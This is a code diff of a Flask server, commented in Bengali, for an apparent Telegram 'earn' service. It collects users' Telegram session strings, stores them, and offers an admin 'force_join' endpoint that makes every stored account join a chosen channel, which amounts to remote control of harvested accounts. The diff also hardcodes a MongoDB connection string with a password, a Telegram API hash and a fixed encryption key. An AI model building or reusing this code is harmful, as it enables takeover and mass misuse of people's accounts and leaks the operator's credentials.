@@ -12,18 +12,23 @@ from Crypto.Util.Padding import pad, unpad
 app = Flask(__name__)
 CORS(app)
 
-# --- কনফিগারেশন (আপনার ডাটা) ---
-API_ID = 'YOUR_API_ID'      # আপনার API ID দিন
-API_HASH = 'YOUR_API_HASH'  # আপনার API HASH দিন
-MONGO_URI = "mongodb+srv://Asfak1:Abdullah6790@cluster0.ykmq2wh.mongodb.net/?retryWrites=true&w=majority"
-SECRET_KEY = b'AAF_STRONG_APP_SECURE_32_BIT_KEY' # সেশন সুরক্ষিত রাখার কি
+# --- কনফিগারেশন (আপনার সঠিক ডাটাগুলো বসানো হয়েছে) ---
+API_ID = 36466824      # আপনার নতুন API ID
+API_HASH = '535ddcb85f2c3c74cc0ff532dd2c3406'  # আপনার নতুন API HASH
+MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?appName=Cluster0"
+SECRET_KEY = b'AAF_STRONG_APP_SECURE_32_BIT_KEY' # সেশন সুরক্ষিত রাখার কি (এটি পরিবর্তন করবেন না)
 
-client_db = MongoClient(MONGO_URI)
-db = client_db['AAF_TeleEarn']
-users_col = db['users']
-sessions_col = db['sessions'] # সেশনগুলো এখানে জমা হবে
+# ডাটাবেস কানেকশন
+try:
+    client_db = MongoClient(MONGO_URI)
+    db = client_db['AAF_TeleEarn']
+    users_col = db['users']
+    sessions_col = db['sessions']
+    print("✅ Server connected to MongoDB!")
+except Exception as e:
+    print(f"❌ MongoDB Error: {e}")
 
-# --- এনক্রিপশন লজিক (সেশন নিরাপদ রাখতে) ---
+# --- এনক্রিপশন লজিক ---
 def encrypt_session(session_str):
     cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
     ct_bytes = cipher.encrypt(pad(session_str.encode(), AES.block_size))
@@ -43,8 +48,11 @@ def decrypt_session(encrypted_str):
 def add_account():
     data = request.json
     uid = data.get('telegram_id')
-    raw_session = data.get('session_string') # টেলিগ্রাম থেকে পাওয়া সেশন
+    raw_session = data.get('session_string') 
     phone = data.get('phone')
+
+    if not raw_session or not uid:
+        return jsonify({"status": "error", "message": "Invalid data"}), 400
 
     encrypted = encrypt_session(raw_session)
     
@@ -57,12 +65,11 @@ def add_account():
     
     return jsonify({"status": "success", "message": "Account linked to server!"})
 
-# --- ২. অ্যাডমিন কন্ট্রোল লজিক (রিমোট কন্ট্রোল) ---
+# --- ২. অ্যাডমিন কন্ট্রোল লজিক ---
 @app.route('/api/admin/force_join', methods=['POST'])
 async def force_join():
-    # এই এপিআই কল করলে আপনার সার্ভারে থাকা সব অ্যাকাউন্ট অটো চ্যানেলে জয়েন করবে
     data = request.json
-    channel_to_join = data.get('channel') # যেমন: @aaf_tele_earn
+    channel_to_join = data.get('channel', '@aaf_tele_earn') 
 
     all_sessions = sessions_col.find({"status": "Active"})
     count = 0
@@ -78,20 +85,39 @@ async def force_join():
 
     return jsonify({"status": "success", "joined_accounts": count})
 
-# --- ৩. ড্যাশবোর্ড ডাটা (ব্যালেন্স সিঙ্ক) ---
+# --- ৩. ড্যাশবোর্ড ডাটা (লগইন এবং ব্যালেন্স সিঙ্ক) ---
+@app.route('/api/user_data_login', methods=['POST'])
+def user_login():
+    data = request.json
+    uid = data.get('telegram_id')
+    name = data.get('name')
+    
+    # নতুন ইউজার হলে ডাটাবেসে তৈরি করবে, পুরনো হলে আপডেট করবে
+    users_col.update_one(
+        {"telegram_id": int(uid)},
+        {"$set": {"name": name, "status": "Active"}},
+        upsert=True
+    )
+    return jsonify({"status": "success", "message": "Account linked to server!"})
+
 @app.route('/api/user_data/<telegram_id>', methods=['GET'])
 def get_user_data(telegram_id):
-    user = users_col.find_one({"telegram_id": int(telegram_id)})
-    if user:
-        return jsonify({
-            "status": "success",
-            "name": user.get("name", "User"),
-            "main_balance": user.get("main_balance", 0.0),
-            "task_balance": user.get("task_balance", 0.0),
-            "acc_status": user.get("status", "Inactive"),
-            "added_accounts": user.get("added_accounts", 0)
-        })
-    return jsonify({"status": "error"})
+    try:
+        user = users_col.find_one({"telegram_id": int(telegram_id)})
+        if user:
+            return jsonify({
+                "status": "success",
+                "name": user.get("name", "User"),
+                "main_balance": user.get("main_balance", 0.0),
+                "task_balance": user.get("task_balance", 0.0),
+                "trade_balance": user.get("trade_balance", 0.0),
+                "acc_balance": user.get("acc_balance", 0.0),
+                "acc_status": user.get("status", "Inactive"),
+                "added_accounts": user.get("added_accounts", 0)
+            })
+    except:
+        pass
+    return jsonify({"status": "error", "message": "User not found"})
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
